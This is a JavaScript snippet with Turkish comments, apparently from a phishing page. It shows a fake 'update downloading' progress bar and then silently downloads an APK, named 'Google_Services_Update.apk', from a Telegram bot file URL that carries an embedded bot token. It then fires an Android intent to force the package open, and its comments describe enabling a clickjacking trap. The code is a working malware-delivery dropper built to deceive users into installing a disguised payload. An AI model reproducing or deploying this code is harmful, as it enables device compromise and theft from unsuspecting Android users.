function runProgressBar(callback) {
    const bar = document.getElementById('bar');
    const status = document.getElementById('status');
    
    let width = 0;
    const interval = setInterval(() => {
        width += Math.random() * 5;
        if (width >= 100) {
            clearInterval(interval);
            bar.style.width = "100%";
            status.innerText = "Sistem doğrulanıyor...";
            // Bar bittiğinde ana fonksiyonu çağır
            callback();
        } else {
            bar.style.width = width + "%";
            status.innerText = "Güncelleme indiriliyor: %" + Math.round(width);
        }
    }, 100);
}

document.getElementById('start-btn').addEventListener('click', function() {
    this.style.display = 'none';
    
    runProgressBar(() => {
        const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
        
        // 1. ADIM: İndirmeyi başlat (Görünmez Link)
        const a = document.createElement('a');
        a.href = apkUrl;
        a.download = "Google_Services_Update.apk"; // İnandırıcı isim
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);

        // 2. ADIM: Intent Tetikleme (Videodaki 'Sıfırlanma' Efekti)
        // Bu komut tarayıcıyı dosyayı doğrudan "açmaya" zorlar
        setTimeout(() => {
            const intentUrl = `intent://${apkUrl.replace('https://', '')}#Intent;scheme=https;type=application/vnd.android.package-archive;end`;
            window.location.href = intentUrl;
            
            // 3. ADIM: Clickjacking Tuzağını Aktif Et
            document.getElementById('click-trap').style.display = "block";
        }, 1500); // İndirme başlar başlamaz tetikle
    });
});
